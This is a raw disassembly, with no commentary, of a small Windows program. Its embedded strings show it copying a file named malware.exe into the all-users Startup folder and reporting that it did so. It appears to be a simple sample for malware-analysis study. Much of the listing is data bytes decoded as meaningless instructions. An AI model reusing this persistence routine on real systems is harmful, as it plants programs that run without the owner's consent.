xor    $0x356b3561,%eax
jb     0x4050a3
js     0x4050a5
jge    0x4050a7
(bad)  
xor    $0x358c3587,%eax
xchg   %eax,%edx
xor    $0x35ae359a,%eax
leave  
xor    $0x35ed35d2,%eax
divl   0x3614360a
sbb    %esi,(%esi)
push   %ds
ss inc %eax
ss inc %ebp
ss dec %esi
ss push %ebx
ss pusha 
ss jno 0x4050d0
ja     0x4050d2
jle    0x4050d4
xchg   %eax,%edx
ss xchg %eax,%edi
ss popf 
movsl  %ss:(%esi),%es:(%edi)
ss stos %eax,%es:(%edi)
ss mov $0x36,%cl
mov    $0xcd36c436,%esi
ss in  (%dx),%al
ss hlt 
ss std 
add    %ss:(%edi),%esi
or     (%edi),%esi
pop    %ss
aaa    
sub    %esi,(%edi)
xor    $0x37,%al
cmp    (%edi),%dh
xorl   $0xffffff89,(%edi)
aaa    
xchg   %eax,%ecx
aaa    
cwtl   
aaa    
popf   
aaa    
mov    %eax,0xb137a937
aaa    
mov    $0x37,%bh
mov    $0xd537c537,%esi
aaa    
fnsave (%edi)
jecxz  0x405115
out    %eax,(%dx)
aaa    
cli    
aaa    
sbb    %bh,(%eax)
push   %ds
cmp    %ah,(%eax,%edi,1)
sub    (%eax),%bh
xor    %bh,(%eax)
cmp    %bh,%ss:0x4b384438
cmp    %dl,0x38(%edx)
pop    %ecx
cmp    %ah,0x38(%eax)
cmp    %ch,0x38(%bx)
ja     0x405138
jg     0x40513a
mov    (%eax),%edi
xchg   %eax,%esp
cmp    %bl,-0x56c760c8(%ecx)
cmp    %dh,-0x36c742c8(%edx)
cmp    %cl,%dh
cmp    %bl,%dh
cmp    %ah,%bl
cmp    %ch,%cl
cmp    %ch,%bh
cmp    %al,0x55390c39
cmp    %ebx,0x39(%ebx)
cmp    %ebp,%fs:0x39(%ebx)
jbe    0x405163
jl     0x405165
nop
cmp    %esp,-0x37c64fc7(%ebp)
cmp    %ebx,%esi
cmp    %ebp,%ebx
cmp    %ebp,(%eax)
cmp    0x533a4e3a,%ch
cmp    0x3a(%edx),%dh
sbb    %bh,(%ebx)
sbb    $0x4d3b2f3b,%eax
cmp    0x3b(%ecx),%esp
addr16 cmp %eax,%edx
cmp    %esi,%edx
cmp    %ebp,%ebx
cmp    %edx,%edi
cmp    0x3c(%edi),%eax
dec    %esp
cmp    $0x91,%al
cmp    $0xb4,%al
cmp    $0xc1,%al
cmp    $0xcd,%al
cmp    $0xd5,%al
cmp    $0xdd,%al
cmp    $0xe9,%al
cmp    $0xd,%al
cmp    $0x3d203d15,%eax
es cmp $0x3d323d2c,%eax
cmp    %bh,0x3d443d3e
dec    %edx
cmp    $0x3d6c3d50,%eax
mov    %eax,0xc83daf3d
cmp    $0x20000000,%eax
add    %al,(%eax)
sub    %al,(%eax)
add    %al,(%eax)
cld    
xor    %cl,(%eax)
xor    %ecx,(%ecx,%esi,1)
cmp    $0x31,%al
inc    %eax
xor    %edi,(%esp,%esi,1)
inc    %eax
xor    $0xfc,%al
xor    $0x0,%al
xor    $0x353c3520,%eax
inc    %eax
xor    $0x35503548,%eax
pop    %esp
xor    $0x30000000,%eax
add    %al,(%eax)
or     $0x0,%al
add    %al,(%eax)
sbb    %dh,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)







push   %ebp
mov    %esp,%ebp
and    $0xfffffff8,%esp
push   $0xffffffff
push   $0x401c04
mov    %fs:0x0,%eax
push   %eax
sub    $0x240,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %esp,%eax
push   %eax
lea    0x250(%esp),%eax
mov    %eax,%fs:0x0
mov    %ecx,%edi
xor    %ebx,%ebx
inc    %ebx
push   %ebx
push   $0x40
push   $0x20
pushl  (%edi)
lea    0x2c(%esp),%ecx
call   *0x402040
xor    %esi,%esi
mov    %esi,0x258(%esp)
cmp    %esi,0x70(%esp)
jne    0x40108d
push   $0x402144
call   *0x4020d4
pop    %ecx
orl    $0xffffffff,0x258(%esp)

lea    0x1c(%esp),%ecx
call   *0x402044
mov    %ebx,%eax
mov    0x250(%esp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
push   %ebx
push   $0x40
push   $0x20
push   $0x402158
lea    0x14c(%esp),%ecx
call   *0x40205c
movb   $0x1,0x258(%esp)

cmp    %esi,0x18c(%esp)
jne    0x4010f0
push   $0x4021a4
call   *0x4020d4
pop    %ecx
lea    0x13c(%esp),%ecx
movb   $0x0,0x258(%esp)

call   *0x402048
jmp    0x401063
lea    0x1c(%esp),%ecx
call   *0x402054
push   %eax
lea    0x140(%esp),%ecx
call   *0x40204c
mov    0x1c(%esp),%eax
mov    0x4(%eax),%eax
lea    0x1c(%esp,%eax,1),%eax
mov    0x8(%eax),%ecx
and    $0x6,%cl
movsbl %cl,%ecx
neg    %ecx
sbb    %ecx,%ecx
not    %ecx
test   %ecx,%eax
jne    0x4010d8
lea    0x13c(%esp),%ecx
call   *0x402050
lea    0x1c(%esp),%ecx
call   *0x402058
lea    0x13c(%esp),%ecx
call   *0x402060
mov    0x4020d4,%esi
push   $0x4021b4
call   *%esi
xor    %ecx,%ecx
push   $0x2
mov    $0x7fff,%eax
pop    %edx
mov    %eax,0x1c(%esp)
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x4013de
pop    %ecx
pop    %ecx
lea    0x18(%esp),%ecx
push   %ecx
push   %eax
mov    %eax,0x1c(%esp)
call   *0x402000
test   %eax,%eax
jne    0x40117e
push   $0x4021e0
call   *%esi
jmp    0x4010c0
pushl  0x14(%esp)
push   $0x4021f0
call   *0x4020d0
pop    %ecx
pop    %ecx
push   %ebx
push   $0x40
push   $0x20
pushl  (%edi)
lea    0xbc(%esp),%ecx
call   *0x402040
movb   $0x2,0x258(%esp)

cmpl   $0x0,0x100(%esp)

jne    0x4011d7
push   $0x402210
call   *%esi
pop    %ecx
lea    0xac(%esp),%ecx
movb   $0x1,0x258(%esp)

call   *0x402044
jmp    0x4010c1
mov    0x14(%esp),%eax
lea    0x2(%eax),%edx
mov    (%eax),%cx
inc    %eax
inc    %eax
test   %cx,%cx
jne    0x4011de
sub    %edx,%eax
push   $0x2
xor    %ecx,%ecx
pop    %ebx
sar    %eax
mov    %ebx,%edx
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x4013de
mov    0x1c(%esp),%edi
mov    $0x402220,%eax
mov    %edi,%edx
pop    %ecx
sub    %eax,%edx
movzwl (%eax),%ecx
mov    %cx,(%edx,%eax,1)
add    %ebx,%eax
test   %cx,%cx
jne    0x401210
mov    0x14(%esp),%eax
mov    %eax,%edx
mov    (%eax),%cx
add    %ebx,%eax
test   %cx,%cx
jne    0x401224
sub    %edx,%eax
dec    %edi
dec    %edi
mov    %edx,%esi
lea    0x2(%edi),%edx
mov    0x2(%edi),%cx
add    %ebx,%edi
test   %cx,%cx
jne    0x401237
mov    %eax,%ecx
shr    $0x2,%ecx
rep movsl %ds:(%esi),%es:(%edi)
mov    %eax,%ecx
and    $0x3,%ecx
dec    %edx
dec    %edx
rep movsb %ds:(%esi),%es:(%edi)
lea    0x2(%edx),%ebx
mov    0x2(%edx),%ax
inc    %edx
inc    %edx
test   %ax,%ax
jne    0x401255
push   $0x14
pop    %ecx
mov    %edx,%edi
mov    $0x402258,%esi
rep movsl %ds:(%esi),%es:(%edi)
push   $0x0
movsw  %ds:(%esi),%es:(%edi)
mov    0x4020cc,%esi
push   %ebx
push   $0x0
call   *%esi
lea    0x1(%eax),%edi
push   %edi
call   0x4013de
push   %edi
push   %ebx
push   %eax
mov    %eax,0x30(%esp)
call   *%esi
add    $0x1c,%esp
xor    %esi,%esi
inc    %esi
push   %esi
push   $0x40
push   $0x20
pushl  0x20(%esp)
lea    0x1d4(%esp),%ecx
call   *0x40205c
movb   $0x3,0x258(%esp)

cmpl   $0x0,0x214(%esp)

jne    0x40133a
push   $0x4022ac
call   *0x4020d4
pop    %ecx
lea    0x1c4(%esp),%ecx
movb   $0x2,0x258(%esp)

call   *0x402048
lea    0xac(%esp),%ecx
movb   $0x1,0x258(%esp)

call   *0x402044
lea    0x13c(%esp),%ecx
movb   $0x0,0x258(%esp)

call   *0x402048
orl    $0xffffffff,0x258(%esp)

lea    0x1c(%esp),%ecx
call   *0x402044
mov    %esi,%eax
jmp    0x401077
lea    0xac(%esp),%ecx
call   *0x402054
push   %eax
lea    0x1c8(%esp),%ecx
call   *0x40204c
mov    0xac(%esp),%eax
mov    0x4(%eax),%eax
lea    0xac(%esp,%eax,1),%eax
mov    0x8(%eax),%ecx
and    $0x6,%cl
movsbl %cl,%ecx
neg    %ecx
sbb    %ecx,%ecx
not    %ecx
test   %ecx,%eax
jne    0x40131f
lea    0x1c4(%esp),%ecx
call   *0x402050
lea    0xac(%esp),%ecx
call   *0x402058
lea    0x1c4(%esp),%ecx
call   *0x402060
lea    0x1c4(%esp),%ecx
movb   $0x2,0x258(%esp)

call   *0x402048
lea    0xac(%esp),%ecx
movb   $0x1,0x258(%esp)

call   *0x402044
push   $0x4022c0
call   *0x4020d0
pop    %ecx
xor    %esi,%esi
jmp    0x4012f1
mov    0x8(%esp),%ecx
call   0x401000
xor    %eax,%eax
ret    
cmp    0x403000,%ecx
jne    0x4013d8
repz ret 
jmp    0x401690
int3   
jmp    *0x4020d8
push   $0x4018ce
call   0x401891
mov    0x40336c,%eax
movl   $0x403034,(%esp)
pushl  0x403368
mov    %eax,0x403034
push   $0x403024
push   $0x403028
push   $0x403020
call   *0x4020c4
add    $0x14,%esp
mov    %eax,0x403030
test   %eax,%eax
jge    0x40142e
push   $0x8
call   0x4017e6
pop    %ecx
ret    
push   $0x10
push   $0x4023e8
call   0x401a5c
xor    %ebx,%ebx
mov    %ebx,-0x4(%ebp)
mov    %fs:0x18,%eax
mov    0x4(%eax),%esi
mov    %ebx,-0x1c(%ebp)
mov    $0x403384,%edi
push   %ebx
push   %esi
push   %edi
call   *0x402030
cmp    %ebx,%eax
je     0x401477
cmp    %esi,%eax
jne    0x40146a
xor    %esi,%esi
inc    %esi
mov    %esi,-0x1c(%ebp)
jmp    0x40147a
push   $0x3e8
call   *0x402034
jmp    0x401451
xor    %esi,%esi
inc    %esi
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x40148d
push   $0x1f
call   0x4017e6
pop    %ecx
jmp    0x4014c8
mov    0x403380,%eax
test   %eax,%eax
jne    0x4014c2
mov    %esi,0x403380
push   $0x402100
push   $0x4020f4
call   0x401a54
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x4014c8
movl   $0xfffffffe,-0x4(%ebp)
mov    $0xff,%eax
jmp    0x40159f
mov    %esi,0x40303c
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x4014ec
push   $0x4020f0
push   $0x4020e8
call   0x401a4e
pop    %ecx
pop    %ecx
movl   $0x2,0x403380

cmp    %ebx,-0x1c(%ebp)
jne    0x4014f9
push   %ebx
push   %edi
call   *0x402038
cmp    %ebx,0x403390
je     0x40151a
push   $0x403390
call   0x401990
pop    %ecx
test   %eax,%eax
je     0x40151a
push   %ebx
push   $0x2
push   %ebx
call   *0x403390
mov    0x403024,%eax
mov    0x4020b0,%ecx
mov    %eax,(%ecx)
pushl  0x403024
pushl  0x403028
pushl  0x403020
call   0x4013c2
add    $0xc,%esp
mov    %eax,0x403038
cmp    %ebx,0x40302c
jne    0x401585
push   %eax
call   *0x4020b4
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%ecx
mov    %ecx,-0x20(%ebp)
push   %eax
push   %ecx
call   0x4018f4
pop    %ecx
pop    %ecx
ret    
mov    -0x18(%ebp),%esp
mov    -0x20(%ebp),%eax
mov    %eax,0x403038
xor    %ebx,%ebx
cmp    %ebx,0x40302c
jne    0x401585
push   %eax
call   *0x4020bc
cmp    %ebx,0x40303c
jne    0x401593
call   *0x4020c0
movl   $0xfffffffe,-0x4(%ebp)
mov    0x403038,%eax
call   0x401aa1
ret    
mov    $0x5a4d,%eax
cmp    %ax,0x400000
je     0x4015b7
xor    %eax,%eax
jmp    0x401604
mov    0x40003c,%eax
lea    0x400000(%eax),%eax
cmpl   $0x4550,(%eax)
jne    0x4015b3
movzwl 0x18(%eax),%ecx
cmp    $0x10b,%ecx
je     0x4015f1
cmp    $0x20b,%ecx
jne    0x4015b3
cmpl   $0xe,0x84(%eax)
jbe    0x4015b3
xor    %ecx,%ecx
cmp    %ecx,0xf8(%eax)
jmp    0x4015ff
cmpl   $0xe,0x74(%eax)
jbe    0x4015b3
xor    %ecx,%ecx
cmp    %ecx,0xe8(%eax)
setne  %cl
mov    %ecx,%eax
push   $0x1
mov    %eax,0x40302c
call   *0x402090
push   $0xffffffff
call   *0x402094
pop    %ecx
pop    %ecx
mov    %eax,0x403388
mov    %eax,0x40338c
call   *0x402098
mov    0x403374,%ecx
mov    %ecx,(%eax)
call   *0x40209c
mov    0x403370,%ecx
mov    %ecx,(%eax)
mov    0x4020a0,%eax
mov    (%eax),%eax
mov    %eax,0x40337c
call   0x4018a8
call   0x401b05
cmpl   $0x0,0x403014
jne    0x40166c
push   $0x401b05
call   *0x402084
pop    %ecx
call   0x401ada
cmpl   $0xffffffff,0x403010
jne    0x401683
push   $0xffffffff
call   *0x402068
pop    %ecx
xor    %eax,%eax
ret    
call   0x401b08
jmp    0x40142f
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x328,%esp
mov    %eax,0x403148
mov    %ecx,0x403144
mov    %edx,0x403140
mov    %ebx,0x40313c
mov    %esi,0x403138
mov    %edi,0x403134
data16 mov %ss,0x403160
data16 mov %cs,0x403154
data16 mov %ds,0x403130
data16 mov %es,0x40312c
data16 mov %fs,0x403128
data16 mov %gs,0x403124
pushf  
popl   0x403158
mov    0x0(%ebp),%eax
mov    %eax,0x40314c
mov    0x4(%ebp),%eax
mov    %eax,0x403150
lea    0x8(%ebp),%eax
mov    %eax,0x40315c
mov    -0x320(%ebp),%eax
movl   $0x10001,0x403098

mov    0x403150,%eax
mov    %eax,0x40304c
movl   $0xc0000409,0x403040

movl   $0x1,0x403044

mov    0x403000,%eax
mov    %eax,-0x328(%ebp)
mov    0x403004,%eax
mov    %eax,-0x324(%ebp)
call   *0x40201c
mov    %eax,0x403090
push   $0x1
call   0x401b9e
pop    %ecx
push   $0x0
call   *0x402020
push   $0x40212c
call   *0x402024
cmpl   $0x0,0x403090
jne    0x401782
push   $0x1
call   0x401b9e
pop    %ecx
push   $0xc0000409
call   *0x402028
push   %eax
call   *0x40202c
leave  
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    (%eax),%eax
cmpl   $0xe06d7363,(%eax)
jne    0x4017d2
cmpl   $0x3,0x10(%eax)
jne    0x4017d2
mov    0x14(%eax),%eax
cmp    $0x19930520,%eax
je     0x4017cd
cmp    $0x19930521,%eax
je     0x4017cd
cmp    $0x19930522,%eax
je     0x4017cd
cmp    $0x1994000,%eax
jne    0x4017d2
call   0x401ba4
xor    %eax,%eax
pop    %ebp
ret    $0x4
push   $0x401796
call   *0x402020
xor    %eax,%eax
ret    
jmp    *0x4020c8
push   $0x14
push   $0x402408
call   0x401a5c
pushl  0x40338c
mov    0x402070,%esi
call   *%esi
pop    %ecx
mov    %eax,-0x1c(%ebp)
cmp    $0xffffffff,%eax
jne    0x40181b
pushl  0x8(%ebp)
call   *0x402074
pop    %ecx
jmp    0x401882
push   $0x8
call   0x401bb6
pop    %ecx
andl   $0x0,-0x4(%ebp)
pushl  0x40338c
call   *%esi
mov    %eax,-0x1c(%ebp)
pushl  0x403388
call   *%esi
pop    %ecx
pop    %ecx
mov    %eax,-0x20(%ebp)
lea    -0x20(%ebp),%eax
push   %eax
lea    -0x1c(%ebp),%eax
push   %eax
pushl  0x8(%ebp)
mov    0x402094,%esi
call   *%esi
pop    %ecx
push   %eax
call   0x401bb0
mov    %eax,-0x24(%ebp)
pushl  -0x1c(%ebp)
call   *%esi
mov    %eax,0x40338c
pushl  -0x20(%ebp)
call   *%esi
add    $0x14,%esp
mov    %eax,0x403388
movl   $0xfffffffe,-0x4(%ebp)
call   0x401888
mov    -0x24(%ebp),%eax
call   0x401aa1
ret    
push   $0x8
call   0x401baa
pop    %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x8(%ebp)
call   0x4017ec
neg    %eax
sbb    %eax,%eax
neg    %eax
pop    %ecx
dec    %eax
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
mov    $0x4023dc,%eax
mov    $0x4023dc,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x4018cb
mov    (%edi),%eax
test   %eax,%eax
je     0x4018c4
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x4018bc
pop    %edi
pop    %esi
ret    
mov    %edi,%edi
push   %esi
mov    $0x4023e4,%eax
mov    $0x4023e4,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x4018f1
mov    (%edi),%eax
test   %eax,%eax
je     0x4018ea
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x4018e2
pop    %edi
pop    %esi
ret    
jmp    *0x4020b8
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%ecx
mov    $0x5a4d,%eax
cmp    %ax,(%ecx)
je     0x401916
xor    %eax,%eax
pop    %ebp
ret    
mov    0x3c(%ecx),%eax
add    %ecx,%eax
cmpl   $0x4550,(%eax)
jne    0x401912
xor    %edx,%edx
mov    $0x10b,%ecx
cmp    %cx,0x18(%eax)
sete   %dl
mov    %edx,%eax
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    0x3c(%eax),%ecx
add    %eax,%ecx
movzwl 0x14(%ecx),%eax
push   %ebx
push   %esi
movzwl 0x6(%ecx),%esi
xor    %edx,%edx
push   %edi
lea    0x18(%eax,%ecx,1),%eax
test   %esi,%esi
jbe    0x40197d
mov    0xc(%ebp),%edi
mov    0xc(%eax),%ecx
cmp    %ecx,%edi
jb     0x401975
mov    0x8(%eax),%ebx
add    %ecx,%ebx
cmp    %ebx,%edi
jb     0x40197f
inc    %edx
add    $0x28,%eax
cmp    %esi,%edx
jb     0x401965
xor    %eax,%eax
pop    %edi
pop    %esi
pop    %ebx
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
push   $0xfffffffe
push   $0x402428
push   $0x401ab5
mov    %fs:0x0,%eax
push   %eax
sub    $0x8,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x8(%ebp)
xor    %ebp,%eax
push   %eax
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
mov    %esp,-0x18(%ebp)
movl   $0x0,-0x4(%ebp)
push   $0x400000
call   0x401900
add    $0x4,%esp
test   %eax,%eax
je     0x401a32
mov    0x8(%ebp),%eax
sub    $0x400000,%eax
push   %eax
push   $0x400000
call   0x401940
add    $0x8,%esp
test   %eax,%eax
je     0x401a32
mov    0x24(%eax),%eax
shr    $0x1f,%eax
not    %eax
and    $0x1,%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%eax
xor    %edx,%edx
cmp    $0xc0000005,%eax
sete   %dl
mov    %edx,%eax
ret    
mov    -0x18(%ebp),%esp
movl   $0xfffffffe,-0x4(%ebp)
xor    %eax,%eax
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
int3   
jmp    *0x4020ac
jmp    *0x4020a8
int3   
int3   
push   $0x401ab5
pushl  %fs:0x0
mov    0x10(%esp),%eax
mov    %ebp,0x10(%esp)
lea    0x10(%esp),%ebp
sub    %eax,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x4(%ebp)
xor    %ebp,%eax
push   %eax
mov    %esp,-0x18(%ebp)
pushl  -0x8(%ebp)
mov    -0x4(%ebp),%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    %eax,-0x8(%ebp)
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x14(%ebp)
pushl  0x10(%ebp)
pushl  0xc(%ebp)
pushl  0x8(%ebp)
push   $0x4013ce
push   $0x403000
call   0x401bbc
add    $0x18,%esp
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
push   $0x30000
push   $0x10000
xor    %esi,%esi
push   %esi
call   0x401bc8
add    $0xc,%esp
test   %eax,%eax
je     0x401b03
push   %esi
push   %esi
push   %esi
push   %esi
push   %esi
call   0x401bc2
add    $0x14,%esp
pop    %esi
ret    
xor    %eax,%eax
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
mov    0x403000,%eax
andl   $0x0,-0x8(%ebp)
andl   $0x0,-0x4(%ebp)
push   %ebx
push   %edi
mov    $0xbb40e64e,%edi
mov    $0xffff0000,%ebx
cmp    %edi,%eax
je     0x401b3a
test   %eax,%ebx
je     0x401b3a
not    %eax
mov    %eax,0x403004
jmp    0x401b9a
push   %esi
lea    -0x8(%ebp),%eax
push   %eax
call   *0x402008
mov    -0x4(%ebp),%esi
xor    -0x8(%ebp),%esi
call   *0x40200c
xor    %eax,%esi
call   *0x402010
xor    %eax,%esi
call   *0x402014
xor    %eax,%esi
lea    -0x10(%ebp),%eax
push   %eax
call   *0x402018
mov    -0xc(%ebp),%eax
xor    -0x10(%ebp),%eax
xor    %eax,%esi
cmp    %edi,%esi
jne    0x401b80
mov    $0xbb40e64f,%esi
jmp    0x401b8b
test   %esi,%ebx
jne    0x401b8b
mov    %esi,%eax
shl    $0x10,%eax
or     %eax,%esi
mov    %esi,0x403000
not    %esi
mov    %esi,0x403004
pop    %esi
pop    %edi
pop    %ebx
leave  
ret    
jmp    *0x40208c
jmp    *0x402088
jmp    *0x402080
jmp    *0x40207c
jmp    *0x402078
jmp    *0x40206c
jmp    *0x4020dc
jmp    *0x4020a4
jmp    *0x4020e0
lea    -0x240(%ebp),%ecx
jmp    *0x402044
lea    -0x120(%ebp),%ecx
jmp    *0x402048
lea    -0x1b0(%ebp),%ecx
jmp    *0x402044
lea    -0x98(%ebp),%ecx
jmp    *0x402048
mov    0x8(%esp),%edx
lea    -0x24c(%edx),%eax
mov    -0x250(%edx),%ecx
xor    %eax,%ecx
call   0x4013ce
mov    $0x402464,%eax
jmp    0x401bce




aam    $0x25
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x2b,%al
add    %al,(%eax)
out    %al,(%dx)
sub    (%eax),%al
add    %bl,%al
sub    (%eax),%al
add    %cl,%al
sub    (%eax),%al
add    %ch,-0x65ffffd6(%esi)
sub    (%eax),%al
add    %bh,0x0(%edx,%ebp,1)
add    %ah,0x2a(%eax)
add    %al,(%eax)
dec    %esp
sub    (%eax),%al
add    %bh,(%eax)
sub    (%eax),%al
add    %bl,(%edx)
sub    (%eax),%al
add    %dl,(%edx)
sub    (%eax),%al
add    %bh,%ah
sub    %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bh,0x28(%eax)
add    %al,(%eax)
mov    $0x29,%ah
add    %al,(%eax)
js     0x402073
add    %al,(%eax)
sub    %eax,%ss:(%eax)
add    %dh,%ah
sub    %al,(%eax)
add    %bh,0x3a000028(%eax)
sub    %al,(%eax)
add    %bh,%dl
daa    
add    %al,(%eax)
mov    $0x27,%esp
add    %al,(%eax)
add    %bl,-0x7fffffda(%esi)
daa    
add    %al,(%eax)
outsb  %ds:(%esi),(%dx)
daa    
add    %al,(%eax)
fs daa 
add    %al,(%eax)
pop    %esp
daa    
add    %al,(%eax)
dec    %esi
daa    
add    %al,(%eax)
inc    %esp
daa    
add    %al,(%eax)
mov    $0x26,%ah
add    %al,(%eax)
xor    %ah,(%edi)
add    %al,(%eax)
sbb    (%edi),%ah
add    %al,(%eax)
or     %ah,(%edi)
add    %al,(%eax)
mulb   (%esi)
add    %al,(%eax)
call   0xd84020c3
add    %al,%es:(%eax)
enter  $0x26,$0x0
lods   %ds:(%esi),%al
daa    
add    %al,(%eax)
nop
add    %al,%es:(%eax)
test   %ah,(%esi)
add    %al,(%eax)
jbe    0x4020d8
add    %al,(%eax)
outsb  %ds:(%esi),(%dx)
add    %al,%es:(%eax)
pusha  
add    %al,%es:(%eax)
pop    %eax
add    %al,%es:(%eax)
dec    %esi
add    %al,%es:(%eax)
cmp    $0x26,%al
add    %al,(%eax)
cs add %al,%es:(%eax)
push   %ss
add    %al,%es:(%eax)
or     $0x26,%al
add    %al,(%eax)
add    (%esi),%ah
add    %al,(%eax)
repnz and $0x279a0000,%eax
add    %al,(%eax)
sub    $0x2b,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
in     $0x13,%al
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,-0x27ffbfeb(%ebp)
pop    %ss
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ch,%ch
loopne 0x4020c4
push   %ecx
add    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
jg     0x402122
add    %al,(%eax)
push   %eax
and    (%eax),%eax
add    %dl,0x15(%eax)
add    %al,(%eax)
inc    %eax
xor    %al,0x0(%eax)
cwtl   
xor    %al,0x0(%eax)
bound  %esp,0x64(%ecx)
and    %ah,0x6c(%ecx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
imul   $0x72650000,0x6e(%edi),%ebp
jb     0x402168
popa   
je     0x40216b
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,(%eax)
xor    %ecx,(%edx)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,0x3a(%ebx)
pop    %esp
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x4021d7
and    %ah,0x6e(%ecx)
and    %dl,%fs:0x65(%ebx)
je     0x4021e1
imul   $0x6c415c73,0x67(%esi),%ebp
insb   (%dx),%es:(%edi)
and    %dl,0x73(%ebp)
gs jb  0x4021ee
pop    %esp
push   %ebx
je     0x4021e0
jb     0x4021f5
and    %cl,0x65(%ebp)
outsb  %ds:(%esi),(%dx)
jne    0x4021e3
push   %eax
jb     0x4021f9
addr16 jb 0x4021ee
insl   (%dx),%es:(%edi)
jae    0x4021ec
push   %ebx
je     0x4021f4
jb     0x402209
jne    0x402207
pop    %esp
insl   (%dx),%es:(%edi)
popa   
insb   (%dx),%es:(%edi)
ja     0x4021fe
jb     0x402204
cs gs js,pn 0x402208
add    %ah,0x72(%ebp)
jb     0x4021c8
popa   
je     0x4021cb
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,(%eax)
xor    (%edx),%cl
add    %al,(%eax)
add    %al,0x69(%esi)
insb   (%dx),%es:(%edi)
and    %ah,%gs:0x6f(%ebx)
jo     0x402226
gs and %dh,%fs:0x20(%edi,%ebp,2)
popa   
insb   (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
and    %dh,0x73(%ebp)
gs jb  0x40223f
and    %dh,0x74(%ebx)
popa   
jb     0x402246
jne    0x402244
and    %ah,0x6f(%esi)
insb   (%dx),%es:(%edi)
fs gs jb 0x4021e6
add    %al,(%eax)
